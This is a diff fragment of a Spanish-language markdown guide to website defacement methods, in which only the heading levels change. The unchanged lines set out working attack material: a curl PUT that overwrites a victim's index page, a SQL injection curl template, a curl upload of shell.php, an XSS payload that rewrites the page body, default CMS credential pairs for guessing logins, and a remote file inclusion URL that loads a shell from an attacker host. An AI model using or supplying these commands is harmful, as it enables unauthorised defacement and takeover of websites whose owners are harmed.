@@ -8,23 +8,23 @@ modifica o reemplaza el contenido de un sitio web sin autorización
 
 curl -X PUT -d "@index25.htm" http://victima.com/index.htm
 
-## 2.-Metodo SQLi Inyección SQL
+### 2.-Metodo SQLi Inyección SQL
 
 curl -s "${URL}${VULN_PATH}${TEST_PAYLOAD}
 
-## 3.- Metodo upload, subir una shell.php
+### 3.- Metodo upload, subir una shell.php
 
 curl -F "file=@shell.php" http://victima.com/upload
 
-## 4.- Metodo XSS
+### 4.- Metodo XSS
 
 <script>document.body.innerHTML = "HACKED";</script>
 
-## 5 - Metodo Vulnerabilidades en CMS (WordPress, Joomla, Drupal), credenciales debiles
+### 5 - Metodo Vulnerabilidades en CMS (WordPress, Joomla, Drupal), credenciales debiles
 
 Usuarios: admin, wordpress, drupal, jomla, manager, administrator .. ,-  Claves: admin, joomla, drupal, wordpress, 123456, password
 
-## 6.- Metodo remote File Inclusion (RFI) / Local File Inclusion (LFI)
+### 6.- Metodo remote File Inclusion (RFI) / Local File Inclusion (LFI)
 
 http://victima.com/index.php?page=http://atacante.com/shell.php
 
